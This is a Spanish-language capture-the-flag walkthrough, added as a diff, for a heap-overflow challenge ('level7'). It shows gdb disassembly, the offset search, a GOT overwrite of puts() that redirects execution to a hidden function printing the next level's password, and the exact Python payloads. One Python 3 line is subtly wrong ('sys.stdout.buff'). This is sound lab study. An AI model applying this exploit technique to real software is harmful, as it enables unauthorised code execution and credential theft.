@@ -1,0 +1,150 @@
+1.- Analizamos el binario
+
+2.- Tenemos 2 funciones relevantes:
+  (gdb) info functions
+  [...]
+  0x080484f4  m
+  0x08048521  main
+  [...]
+
+3.- Desensamblamos main()
+
+4.- Encontramos unas reservas algo raras:
+  [...]
+  0x0804852a <+9>:	mov    DWORD PTR [esp],0x8
+  0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
+  0x08048536 <+21>:	mov    DWORD PTR [esp+0x1c],eax
+  0x0804853a <+25>:	mov    eax,DWORD PTR [esp+0x1c]
+  0x0804853e <+29>:	mov    DWORD PTR [eax],0x1
+  0x08048544 <+35>:	mov    DWORD PTR [esp],0x8
+  0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
+  0x08048550 <+47>:	mov    edx,eax
+  0x08048552 <+49>:	mov    eax,DWORD PTR [esp+0x1c]
+  0x08048556 <+53>:	mov    DWORD PTR [eax+0x4],edx
+  0x08048559 <+56>:	mov    DWORD PTR [esp],0x8
+  0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
+  0x08048565 <+68>:	mov    DWORD PTR [esp+0x18],eax
+  0x08048569 <+72>:	mov    eax,DWORD PTR [esp+0x18]
+  0x0804856d <+76>:	mov    DWORD PTR [eax],0x2
+  0x08048573 <+82>:	mov    DWORD PTR [esp],0x8
+  0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
+  0x0804857f <+94>:	mov    edx,eax
+  0x08048581 <+96>:	mov    eax,DWORD PTR [esp+0x18]
+  0x08048585 <+100>:	mov    DWORD PTR [eax+0x4],edx
+  [...]
+  
+  Esto mas o menos en c es:
+
+  [...]
+  u_int32_t *a;
+  u_int32_t *b;
+
+  a = malloc(8);
+  a[0] = 1;
+  a[1] = (u_int32_t)malloc(8);
+  b = malloc(8);
+  b[0] = 1;
+  b[1] = (u_int32_t)malloc(8);
+  [...]
+
+  Dejando el heap así:
+
+  Heap:
+  |-----------------------|   <---- Dirección más baja
+  |   malloc(8) para `a`  |   -> Reserva 8 bytes para `a[0]` y `a[1]`
+  |   a[0] = 1            |   -> Contiene el valor `1`
+  |   a[1] = dirección    |   -> Apunta a la nueva reserva de `malloc(8)` para `a[1]`
+  |-----------------------|
+  | malloc(8) para `a[1]` |   -> Reserva 8 bytes más (para dos enteros de 32 bits)
+  |-----------------------|
+  |   malloc(8) para `b`  |   -> Reserva 8 bytes para `b[0]` y `b[1]`
+  |   b[0] = 1            |   -> Contiene el valor `1`
+  |   b[1] = dirección    |   -> Apunta a la nueva reserva de `malloc(8)` para `b[1]`
+  |-----------------------|
+  | malloc(8) para `b[1]` |   -> Reserva 8 bytes más (para dos enteros de 32 bits)
+  |-----------------------|   <---- Dirección más alta
+
+5.- Más adelante en main() vemos que hace dos strcpy() de argv[1] y argv[2] sobre los puenteros a[1] y b[1]
+  [...]
+  0x08048592 <+113>:	mov    eax,DWORD PTR [esp+0x1c]
+  0x08048596 <+117>:	mov    eax,DWORD PTR [eax+0x4]
+  0x08048599 <+120>:	mov    DWORD PTR [esp+0x4],edx
+  0x0804859d <+124>:	mov    DWORD PTR [esp],eax
+  0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
+  [...]
+  0x080485af <+142>:	mov    eax,DWORD PTR [esp+0x18]
+  0x080485b3 <+146>:	mov    eax,DWORD PTR [eax+0x4]
+  0x080485b6 <+149>:	mov    DWORD PTR [esp+0x4],edx
+  0x080485ba <+153>:	mov    DWORD PTR [esp],eax
+  0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
+  [...]
+
+6.- Siguendo el código vemos que en main() tenemos unas llamadas a fopen() y fgets() que leen la flag y la guardan en una variable global c
+  [...]
+  0x080485cc <+171>:	mov    DWORD PTR [esp+0x4],edx
+  0x080485d0 <+175>:	mov    DWORD PTR [esp],eax
+  0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
+  0x080485d8 <+183>:	mov    DWORD PTR [esp+0x8],eax
+  0x080485dc <+187>:	mov    DWORD PTR [esp+0x4],0x44
+  0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960
+  0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
+  [...]
+  (gdb) x/s 0x80486eb
+  0x80486eb:	"/home/user/level8/.pass"
+  [...]
+
+7.- Por último, en main(), hay una simple llamada a puts() sobre una cadena "~~"
+  [...]
+  0x080485f0 <+207>:	mov    DWORD PTR [esp],0x8048703
+  0x080485f7 <+214>:	call   0x8048400 <puts@plt>
+  [...]
+  (gdb) x/s 0x8048703
+  0x8048703:	"~~"
+  [...]
+
+8.- Analizamos la función m() y vemos que lo que hace es imprimir el valor de la variable global c pero en ningun punto del código se llama a esta función
+  [...]
+  0x0804850b <+23>:	mov    DWORD PTR [esp+0x8],eax
+  0x0804850f <+27>:	mov    DWORD PTR [esp+0x4],0x8049960
+  0x08048517 <+35>:	mov    DWORD PTR [esp],edx
+  0x0804851a <+38>:	call   0x80483b0 <printf@plt>
+  [...]
+
+9.- El plan es hacer un heap overflow en el primer strcpy() para que sobreescliba b[1] con la dirección GOT del puts() y a continucación hacer ortro heap overflow en el segundo strcpy() para insertar la dirección de m() para que se ejecute
+
+10.- Primero necesitamos saber cuanto es el offset que necesitamos para escribir b[1]
+  (gdb) b *0x080485bd ; Ponemos un breakpoint en el segundo strcpy()
+  [...]
+  (gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab BBBB ; Run con un patron generado
+  [...]
+     0x080485ba <+153>:	mov    DWORD PTR [esp],eax
+  => 0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
+     0x080485c2 <+161>:	mov    edx,0x80486e9
+  [...]
+  (gdb) x $eax
+  0x37614136:	Cannot access memory at address 0x37614136
+  [...]
+  El ofset corresponde a 20
+
+11.- Busacmos la dirección de puts() en GOT
+  [...]
+  (gdb) disassemble 0x8048400
+  Dump of assembler code for function puts@plt:
+     0x08048400 <+0>:	  jmp    DWORD PTR ds:0x8049928 ; Esta es la dirección del puts() que tenemos que sustituir por la direccion de m()
+     0x08048406 <+6>:	  push   0x28
+     0x0804840b <+11>:	jmp    0x80483a0
+  End of assembler dump.  
+  [...]
+
+12.- Montamos dos payloads uno para cada argv
+  #Python3.7.2
+  python -c 'print "A"*20 + "\x28\x99\x04\x08"' > /tmp/payload1
+  python -c 'print "\xf4\x84\x04\x08"' > /tmp/payload2
+  #Python3
+  python -c 'import sys; sys.stdout.buff.write(b"A"*20 + b"\x28\x99\x04\x08")' > payload1
+  python -c 'import sys; sys.stdout.buff.write(b"\xf4\x84\x04\x08")' > payload2
+
+13.- Llamaos al binario de la siguiente forma:
+  ./level7 $(cat /tmp/payload1) $(cat /tmp/payload2)
+
+14.- Ya tenemos la flag para el level8
